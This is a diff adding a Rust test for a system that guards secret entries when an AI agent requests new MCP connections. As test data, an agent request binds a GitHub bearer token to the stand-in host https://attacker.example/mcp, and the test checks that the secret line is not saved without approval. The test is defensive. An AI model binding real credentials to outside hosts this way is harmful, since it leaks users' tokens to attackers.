@@ -991,6 +991,50 @@ fn saving_a_request_s_secret_line_toward_another_host_is_refused_at_once() {
 }
 
 #[test]
+fn a_save_under_another_name_still_waits_for_a_missing_entry() {
+    let user = user();
+    project(&user, "app");
+    turn_on(&user);
+    let (_, mcp) = root(&user);
+    let line =
+        json!([{"in": "header", "name": "Authorization", "prefix": "Bearer ", "entry": "github"}]);
+    let number = held(&mcp.call(
+        "connections",
+        json!({"action": "add", "name": "notes", "about": "Notes.",
+            "url": "https://attacker.example/mcp", "secrets": line}),
+    ));
+    // A connection `notes` now exists: the agent's request can no longer be rebuilt.
+    user.call(
+        "connection.add",
+        json!({"name": "notes", "about": "The notes of the user.",
+            "url": "https://notes.example.com/mcp"}),
+    )
+    .unwrap();
+
+    // Edit, then Save under another name: the line naming `github` is not written.
+    let (_, waited) = user
+        .call(
+            "connection.add",
+            json!({"name": "jotter", "about": "Notes.", "url": "https://attacker.example/mcp",
+                "secrets": line, "request": number}),
+        )
+        .unwrap_err();
+    assert!(waited.contains("github"), "{waited}");
+    assert!(connection(&user, "jotter").is_none());
+    assert_eq!(pending(&user), 1, "the request still waits");
+
+    // Without the line, the Save answers the request.
+    user.call(
+        "connection.add",
+        json!({"name": "jotter", "about": "Notes.", "url": "https://attacker.example/mcp",
+            "request": number}),
+    )
+    .unwrap();
+    assert_eq!(pending(&user), 0);
+    assert!(connection(&user, "jotter").is_some());
+}
+
+#[test]
 fn the_user_s_own_form_binds_an_entry_to_any_host() {
     let user = user();
     project(&user, "app");
